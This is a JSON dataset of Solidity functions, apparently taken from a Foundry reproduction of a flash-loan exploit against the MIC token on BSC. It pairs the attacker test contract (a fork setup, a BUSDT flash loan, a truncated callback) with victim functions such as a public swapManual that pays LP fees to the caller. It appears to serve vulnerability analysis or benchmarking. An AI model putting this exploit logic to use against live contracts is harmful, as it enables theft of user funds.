[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        approveRouter();\n        // Here I decided to skip the swap from Fake USDT to BUSDT because of some restrictions when\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        vm.label(address(BUSDT_USDC), \"BUSDT_USDC\");\n        vm.label(address(BUSDT_MIC), \"BUSDT_MIC\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(MIC), \"MIC\");\n        vm.label(address(BUSDT), \"BUSDT\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(FakeUSDT), \"FakeUSDT\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(BUSDT), address(this), 0);\n        deal(address(this), 0);\n        emit log_named_decimal_uint(\n            \"Exploiter BUSDT balance before attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        // Flashloan 1700 BUSDT tokens\n        BUSDT_USDC.flash(address(this), flashBUSDTAmount, 0, abi.encodePacked(uint8(0)));\n\n        emit log_named_decimal_uint(\n            \"Exploiter BUSDT balance after attack\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "swapManual",
    "original_code": "    function swapManual() public {\n        swapping = true;\n        if(amountAddr1Fee > 0) swapAndSendAddr1Fee(amountAddr1Fee);\n        if(amountAddr2Fee > 0) swapAndSendAddr2Fee(amountAddr2Fee);\n        if(amountAddr3Fee > 0) swapAndSendAddr3Fee(amountAddr3Fee);\n        if(amountAddr4Fee > 0) swapAndSendAddr4Fee(amountAddr4Fee);\n        if(amountAddr5Fee > 0) swapAndSendAddr5Fee(amountAddr5Fee);\n        if(amountAddr6Fee > 0) swapAndSendAddr6Fee(amountAddr6Fee);\n        if(amountLPFee > 0) swapAndSendLPFee(msg.sender);\n        swapping = false;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMIC",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LPFeeClaimer",
    "source_type": "victim_contract",
    "function_name": "claim",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LPFeeClaimer",
    "source_type": "victim_contract",
    "function_name": "remove",
    "original_code": "",
    "description": ""
  }
]